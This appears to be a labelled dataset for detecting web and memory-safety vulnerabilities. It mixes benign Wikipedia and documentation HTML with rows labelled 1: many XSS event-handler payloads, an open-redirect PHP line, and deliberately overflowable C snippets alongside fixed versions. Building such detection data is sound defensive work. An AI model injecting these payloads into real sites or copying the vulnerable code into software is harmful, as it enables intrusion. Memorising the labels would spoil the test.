+"<li id=""cite_note-ivak1971-253""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ivak1971_253-0"">^ </a> </b>",0
+<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,1
+ </div>,0
+"<li id=""cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0"">^ </a> </b>",0
+<textarea onpointermove=alert(1)>XSS</textarea>,1
+</body>,0
+document.write,1
+<area onpointerenter=alert(1)>XSS</area>,1
+"<marquee onbeforecut=""alert(1)"" contenteditable>test</marquee>",1
+"<audio oncontextmenu=""alert(1)"">test</audio>",1
+<isindex onpointerup=alert(1)>XSS</isindex>,1
+"<ul><li><a rel=""nofollow"" class=""external text"" href=""http://www.ieee-cis.org/"">IEEE Computational Intelligence Society </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/"">Archived </a> 9 May 2008 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> </li> </ul>",0
+"<li id=""cite_note-330""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-330"">^ </a> </b>",0
+"<strike onmouseup=""alert(1)"">test</strike>",1
+"<div id=""John_McCarthy"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0
+<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,1
+"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",1
+"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>",1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>",0
+"<summary onpaste=""alert(1)"" contenteditable>test</summary>",1
+<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,1
+"<video onmouseout=""alert(1)"">test</video>",1
+"<nav onclick=""alert(1)"">test</nav>",1
+	 </span>,0
+"<div style=""padding:0em 0.25em"">",0
+"<noembed onkeyup=""alert(1)"" contenteditable>test</noembed>",1
+"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",1
+"<li class=""toclevel-3 tocsection-55""><a href=""#Autonomous_weapons""><span class=""tocnumber"">8.2.5",0
+<video onpointermove=alert(1)>XSS</video>,1
+<input onchange=alert(1) value=xss>,1
+"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1
+<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,1
+<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,1
+"<li><a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Koch, Christof </a>, ""Proust among the Machines"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Christof Koch </a> doubts the possibility of ""intelligent"" machines attaining <a href=""/wiki/Consciousness"" title=""Consciousness"">consciousness </a>, because ""[e]ven the most sophisticated <a href=""/wiki/Brain_simulation"" title=""Brain simulation"">brain simulations </a> are unlikely to produce conscious <a href=""/wiki/Feelings"" class=""mw-redirect"" title=""Feelings"">feelings </a>."" (p.&#160;48.) According to Koch, ""Whether machines can become <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a> [is important] for <a href=""/wiki/Ethics"" title=""Ethics"">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href=""/wiki/Global_Workspace_Theory#Global_neuronal_workspace"" class=""mw-redirect"" title=""Global Workspace Theory"">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href=""/wiki/Point_of_view_(philosophy)"" title=""Point of view (philosophy)"">point of view </a>.... Once computers' <a href=""/wiki/Cognitive_abilities"" class=""mw-redirect"" title=""Cognitive abilities"">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href=""/wiki/Rights"" title=""Rights"">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href=""/wiki/Pain"" title=""Pain"">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself."" (p.&#160;49.) </li>",0
+"<keygen onclick=""alert(1)"">test</keygen>",1
+"<meter oncut=""alert(1)"" contenteditable>test</meter>",1
+"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",1
+"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.bbc.com/news/technology-35785875"">""Artificial intelligence: Google's AlphaGo beats Go master Lee Se-dol"" </a>. <i>BBC News </i>. 12 March 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875"">Archived </a> from the original on 26 August 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">1 October",0
+<strike onpointerover=alert(1)>XSS</strike>,1
+	 </span> ,0
+"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",1
+"<main onmousedown=""alert(1)"">test</main>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1
+</head>,0
+"<command oncontextmenu=""alert(1)"">test</command>",1
+"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>",1
+"<link onkeydown=""alert(1)"" contenteditable>test</link>",1
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;430–435 </li>",0
+<command onpointerover=alert(1)>XSS</command>,1
+"</span> <span class=""reference-text""><cite class=""citation journal"">Samuel, A. L. (July 1959). ""Some Studies in Machine Learning Using the Game of Checkers"". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254"">10.1.1.368.2254 </a>",0
+<input id=x tabindex=1 onactivate=alert(1)></input>,1
+"<tr onpaste=""alert(1)"" contenteditable>test</tr>",1
+ </li>,0
+"<samp onmousemove=""alert(1)"">test</samp>",1
+"<script onmousemove=""alert(1)"">test</script>",1
+"<td onmouseenter=""alert(1)"">test</td>",1
+"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",1
+"<form draggable=""true"" ondragend=""alert(1)"">test</form>",1
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testing+Self-Driving+Truck+Platoons&amp;rft.date=2017-08-24&amp;rft.aulast=Burgess&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.co.uk%2Farticle%2Fuk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<div role=""navigation"" class=""navbox"" aria-labelledby=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0
+"<iframe onmouseenter=""alert(1)"">test</iframe>",1
+"<listing onkeydown=""alert(1)"" contenteditable>test</listing>",1
+<svg><ol onload=alert(1)></ol>,1
+ </li>,0
+"<base onmouseover=""alert(1)"">test</base>",1
+	 </span>,0
+"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",1
+"<dt><a class=""reference internal"" href=""topics/deploy.html""><span class=""doc"">Deploying Spiders",0
+	 </span>,0
+"<keygen onmouseleave=""alert(1)"">test</keygen>",1
+"<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id=""cite_ref-Brain_simulation_153-1"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup> </dd> </dl>",0
+ </li>,0
+<hr id=x tabindex=1 onactivate=alert(1)></hr>,1
+</span> </h3>,0
+"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1
+<bdo onpointerdown=alert(1)>XSS</bdo>,1
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Software_development"" title=""Software development"">Software development </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1
+"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,1
+"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",1
+<basefont onpointerup=alert(1)>XSS</basefont>,1
+"<li id=""cite_note-378""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-378"">^ </a> </b>",0
+"<li>Try the <a class=""reference internal"" href=""faq.html""><span class=""doc"">FAQ",0
+"<form ondblclick=""alert(1)"">test</form>",1
+"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",0
+"	 </span> <span class=""toctext"">Perception ",0
+"<li id=""cite_note-Decision_tree-217""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Decision_tree_217-0"">^ </a> </b>",0
+ </li>,0
+<image srcset=1 onerror=alert(1)>,1
+<address id=x tabindex=1 onactivate=alert(1)></address>,1
+<tr onpointerup=alert(1)>XSS</tr>,1
+"</span> <span class=""reference-text""><cite class=""citation journal"">Smoliar, Stephen W.; Zhang, HongJiang (1994). ""Content based video indexing and retrieval"". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F93.311653"">10.1109/93.311653 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+<header id=x tabindex=1 onfocus=alert(1)></header>,1
+"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",0
+"<track onmouseleave=""alert(1)"">test</track>",1
+	 </span> </li>,0
+"<li><a href=""/wiki/Rudolf_Steiner"" title=""Rudolf Steiner"">Rudolf Steiner </a> </li>",0
+ </li>,0
+"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",1
+"<content onmouseleave=""alert(1)"">test</content>",1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>",0
+"<fieldset onmouseover=""alert(1)"">test</fieldset>",1
+<tfoot onpointerup=alert(1)>XSS</tfoot>,1
+"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>",1
+"<span draggable=""true"" ondragend=""alert(1)"">test</span>",1
+                latest,0
+"<applet oncut=""alert(1)"" contenteditable>test</applet>",1
+"		<a href=""/wiki/File:Kismet_robot_at_MIT_Museum.jpg"" class=""image"">",0
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft_id=https%3A%2F%2Fars.electronica.art%2Foutofthebox%2Fen%2Fdigital-humanism-conf%2F+Retrieved+September+2019&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1
+	 </span>,0
+"d=""alert('');\"")"";",1
+"<li onmouseup=""alert(1)"">test</li>",1
+          <dd>,0
+"<button onmousedown=""alert(1)"">test</button>",1
+	 </span>,0
+ </li>,0
+"	<span class=""mw-editsection-bracket"">] ",0
+"<li id=""cite_note-393""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-393"">^ </a> </b>",0
+"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",1
+<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,1
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+</dl>,0
+ </li>,0
+"	<form action=""/w/index.php"" id=""searchform"">",0
+"    <link rel=""search"" title=""Search"" href=""search.html"" />",0
+"<li><a href=""/wiki/Gaussian_adaptation"" title=""Gaussian adaptation"">Gaussian adaptation </a> </li>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",1
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,1
+<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1
+<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,1
+"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",1
+"<em onbeforepaste=""alert(1)"" contenteditable>test</em>",1
+"<menu onkeyup=""alert(1)"" contenteditable>test</menu>",1
+"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=42"" title=""Edit section: Video games"">edit </a><span class=""mw-editsection-bracket"">]",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",0
+"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",1
+<style id=x tabindex=1 onactivate=alert(1)></style>,1
+"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>",1
+"<section onmouseover=""alert(1)"">test</section>",1
+"<li><a href=""/wiki/Propositional_attitude"" title=""Propositional attitude"">Propositional attitude </a> </li>",0
+"<title onmouseout=""alert(1)"">test</title>",1
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;863–898 </li>",0
+<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1
+<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,1
+"<acronym onmousemove=""alert(1)"">test</acronym>",1
+<input onpointermove=alert(1)>XSS</input>,1
+header('Location: '.$_GET['param']);,1
+</span> </h3>,0
+"<slot oncontextmenu=""alert(1)"">test</slot>",1
+"<li id=""cite_note-150""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-150"">^ </a> </b>",0
+</span> 2015,0
+"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",1
+<div onpointerleave=alert(1)>XSS</div>,1
+"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0
+"<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>",0
+<svg><spacer onload=alert(1)></spacer>,1
+"<li><a href=""/wiki/Electronic_design_automation"" title=""Electronic design automation"">Electronic design automation </a> </li>",0
+"<nav oncopy=""alert(1)"" contenteditable>test</nav>",1
+"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",0
+	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0
+<applet onreadystatechange=alert(1)></applet>,1
+"<h3><span id=""Machine_consciousness.2C_sentience_and_mind"">",0
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
+"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",1
+"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",1
+"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0
+<body onpointerover=alert(1)>XSS</body>,1
+<track id=x tabindex=1 onfocusin=alert(1)></track>,1
+"<div onmouseleave=""alert(1)"">test</div>",1
+"<li id=""cite_note-guardian_jobs_debate-24""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-guardian_jobs_debate_24-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-guardian_jobs_debate_24-1""><sup><i><b>b </b> </i> </sup> </a>",0
+"	 </span> <span class=""toctext"">Motion and manipulation ",0
+"<li onmousedown=""alert(1)"">test</li>",1
+</ul>,0
+<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,1
+<element onpointerenter=alert(1)>XSS</element>,1
+<footer id=x tabindex=1 onactivate=alert(1)></footer>,1
+"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+</span> 2018,0
+"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>",1
+"</span> <span class=""reference-text""><cite class=""citation arxiv"">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). ""Multilingual Language Processing From Bytes"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1512.00103"">1512.00103 </a>",0
+	 </span></p>,0
+"<li>Sun, R. &amp; Bookman, L. (eds.), <i>Computational Architectures: Integrating Neural and Symbolic Processes </i>. Kluwer Academic Publishers, Needham, MA. 1994. </li>",0
+"<source draggable=""true"" ondragend=""alert(1)"">test</source>",1
+	 </span> </li>,0
+<section id=x tabindex=1 onfocusin=alert(1)></section>,1
+"<li><a href=""/wiki/Valentin_Turchin"" title=""Valentin Turchin"">Valentin Turchin </a> </li>",0
+"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",1
+"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",1
+ ,0
+"<div style=""padding:0em 0.25em"">",0
+"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1
+"<style>:target {transform: rotate(180deg);}</style><canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></canvas>",1
+"<details onkeydown=""alert(1)"" contenteditable>test</details>",1
+      </dl>,0
+"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1
+<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,1
+"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",1
+"<font oncontextmenu=""alert(1)"">test</font>",1
+ </div> </td> </tr> </tbody> </table> </div>,0
+<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,1
+"<table draggable=""true"" ondragenter=""alert(1)"">test</table>",1
+"<big onmouseenter=""alert(1)"">test</big>",1
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,1
+"<li><a href=""/wiki/File:Socrates.png"" class=""image""><img alt=""Socrates.png"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png"" decoding=""async"" width=""18"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x"" data-file-width=""326"" data-file-height=""500"" /> </a> <a href=""/wiki/Portal:Philosophy"" title=""Portal:Philosophy"">Philosophy&#32;portal </a> </li> </ul>",0
+"<tt onmouseover=""alert(1)"">test</tt>",1
+"</span> <span class=""reference-text"">Steering for the 1995 ""<a href=""/wiki/History_of_autonomous_cars#1990s"" class=""mw-redirect"" title=""History of autonomous cars"">No Hands Across America </a>"" required ""only a few human assists"".",0
+"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September",0
+"void f(){
+  char data[10];
+fgets(data, sizeof(data), stdin);",0
+"void f(){
+  void func(char *s){ char buf[5]; strcpy(buf, s); }
+}",1
+"// user input handler
+char buf[8];
+strcpy(buf, user_input);
+}",1
+"void f(){
+  char buffer[16];
+sprintf(buffer, ""%s%s"", a, b);
+// end",1
+"char tmp[8]; for(i=0;i<strlen(s);i++) tmp[i]=s[i];
+// end",1
+"void f(){
+  char bufferf[50]; memcpy(bufferf, src, len);",1
+"// user input handler
+char dataf[50]; memcpy(dataf, src, len);",1
+"// safe example
+char tmp[16];
+snprintf(tmp, sizeof(tmp), ""%s%s"", a, b);
+// end",0
+"char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char user_input_buf[8]; for(i=0;i<strlen(s);i++) user_input_buf[i]=s[i];
+// end",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+// end",0
+"/* fixed */
+char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);
+}",0
+"// user input handler
+void func(char *s){ char data[5]; strcpy(data, s); }
+// end",1
+"// user input handler
+char dataf[50]; memcpy(dataf, src, len);
+}",1
+"void f(){
+  void read_user_input(){ char buf[8]; read(fd, buf, min(1024, sizeof(buf))); }
+}",0
+"void f(){
+  char user_input_buf[20]; strcat(user_input_buf, extra);
+}",1
+"// user input handler
+char buffer[8]; for(i=0;i<strlen(s);i++) buffer[i]=s[i];
+}",1
+"/* vulnerable */
+char *p = malloc(10);
+strcpy(p, data);
+}",1
+"/* vulnerable */
+char buf[8]; for(i=0;i<strlen(s);i++) buf[i]=s[i];
+}",1
+"// user input handler
+char user_input_buf[8];
+strcpy(user_input_buf, user_input);",1
+"char name[32]; scanf(""%s"", name);
+}",1
+"/* fixed */
+void func(char *s){ char buf[5]; strncpy(buf, s, 4); buf[4]=0; }",0
+"// user input handler
+char tmp[20]; strcat(tmp, extra);
+// end",1
+"void f(){
+  char data[8];
+strncpy(data, user_input, 7);",0
+"/* vulnerable */
+char buf[20]; strcat(buf, extra);",1
+"char buf[8]; for(i=0;i<min(strlen(s), sizeof(buf)-1); i++) buf[i]=s[i]; buf[min(strlen(s), sizeof(buf)-1)]=0;
+}",0
+"// user input handler
+void func(char *s){ char user_input_buf[5]; strcpy(user_input_buf, s); }",1
+"// user input handler
+void func(char *s){ char user_input_buf[5]; strcpy(user_input_buf, s); }",1
+"// user input handler
+char name[32]; scanf(""%s"", name);
+// end",1
+"/* fixed */
+char buf[20]; strncat(buf, extra, sizeof(buf)-strlen(buf)-1);",0
+"void f(){
+  char name[32]; scanf(""%s"", name);
+}",1
+"void f(){
+  char buffer[20]; strncat(buffer, extra, sizeof(buffer)-strlen(buffer)-1);
+}",0
+"void read_user_input(){ char user_input_buf[64]; read(fd, user_input_buf, 1024); }",1
+"// user input handler
+char name[32]; scanf(""%s"", name);",1
+"/* fixed */
+char buffer[8]; for(i=0;i<min(strlen(s), sizeof(buffer)-1); i++) buffer[i]=s[i]; buffer[min(strlen(s), sizeof(buffer)-1)]=0;",0
+"// user input handler
+char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);",1
+"// user input handler
+char tmp[16];
+sprintf(tmp, ""%s%s"", a, b);",1
+"void f(){
+  void func(char *s){ char tmp[5]; strcpy(tmp, s); }",1
+char data[8]; for(i=0;i<strlen(s);i++) data[i]=s[i];,1
+"void f(){
+  char buffer[10];
+fgets(buffer, sizeof(buffer), stdin);",0
+"void f(){
+  char buf[8];
+strncpy(buf, user_input, 7);
+}",0
+"// user input handler
+char name[32]; scanf(""%s"", name);
+// end",1
+"// user input handler
+char data[8]; for(i=0;i<strlen(s);i++) data[i]=s[i];
+}",1
+"void func(char *s){ char buffer[5]; strncpy(buffer, s, 4); buffer[4]=0; }",0
+"void f(){
+  char buffer[20]; strcat(buffer, extra);
+}",1
+"// safe example
+char user_input_buf[10];
+fgets(user_input_buf, sizeof(user_input_buf), stdin);
+// end",0
+"void f(){
+  char tmp[20]; strcat(tmp, extra);
+}",1
+"char name[32]; scanf(""%31s"", name);
+// end",0
+"// safe example
+char name[32]; scanf(""%31s"", name);",0
+"// user input handler
+char tmp[8];
+strcpy(tmp, user_input);
+// end",1
+"void f(){
+  void read_user_input(){ char user_input_buf[8]; read(fd, user_input_buf, min(1024, sizeof(user_input_buf))); }
+}",0
+"// user input handler
+char user_input_buf[8];
+strcpy(user_input_buf, user_input);
+}",1
+"char tmpf[50]; memcpy(tmpf, src, len);
+// end",1
+"void func(char *s){ char tmp[5]; strcpy(tmp, s); }",1
+"/* vulnerable */
+char buf[16];
+sprintf(buf, ""%s%s"", a, b);
+}",1
+"void f(){
+  char user_input_buf[10];
+gets(user_input_buf);
+}",1
+"/* vulnerable */
+char user_input_buf[10];
+gets(user_input_buf);",1
+"// user input handler
+void func(char *s){ char tmp[5]; strcpy(tmp, s); }",1
+"/* fixed */
+char name[32]; scanf(""%31s"", name);",0
+"void f(){
+  void read_user_input(){ char user_input_buf[16]; read(fd, user_input_buf, 1024); }",1
+"// safe example
+char buffer[8];
+strncpy(buffer, user_input, 7);
+// end",0
+"void f(){
+  char data[8];
+strcpy(data, user_input);
+// end",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);
+}",0
+"// safe example
+void func(char *s){ char buffer[5]; strncpy(buffer, s, 4); buffer[4]=0; }
+}",0
+"/* fixed */
+void read_user_input(){ char buf[8]; read(fd, buf, min(1024, sizeof(buf))); }
+// end",0
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+}",0
+"// safe example
+char name[32]; scanf(""%31s"", name);
+// end",0
+"/* vulnerable */
+char buf[8];
+strcpy(buf, user_input);
+}",1
+"void f(){
+  char name[32]; scanf(""%31s"", name);
+}",0
+"// safe example
+void func(char *s){ char user_input_buf[5]; strncpy(user_input_buf, s, 4); user_input_buf[4]=0; }
+// end",0
+"/* fixed */
+char data[16];
+snprintf(data, sizeof(data), ""%s%s"", a, b);
+// end",0
+"// safe example
+char name[32]; scanf(""%31s"", name);
+}",0
+"char user_input_buf[16];
+sprintf(user_input_buf, ""%s%s"", a, b);",1
+"void f(){
+  char buffer[10];
+gets(buffer);
+}",1
+"// safe example
+char *p = malloc(10);
+strncpy(p, data, 9);",0
+"void f(){
+  char user_input_buf[20]; strcat(user_input_buf, extra);
+}",1
+"char *p = malloc(10);
+strcpy(p, data);
+// end",1
+"/* vulnerable */
+char tmp[8];
+strcpy(tmp, user_input);",1
+"/* fixed */
+char *p = malloc(10);
+strncpy(p, data, 9);
+// end",0
+"/* vulnerable */
+char tmp[8];
+strcpy(tmp, user_input);
+// end",1
+"/* vulnerable */
+void read_user_input(){ char data[64]; read(fd, data, 1024); }
+// end",1
+"// user input handler
+char buffer[20]; strcat(buffer, extra);
+}",1
+"char buffer[10];
+gets(buffer);
+// end",1
+"// user input handler
+char *p = malloc(10);
+strcpy(p, data);",1
+"// user input handler
+char bufferf[50]; memcpy(bufferf, src, len);",1
+"// user input handler
+char user_input_buf[16];
+sprintf(user_input_buf, ""%s%s"", a, b);
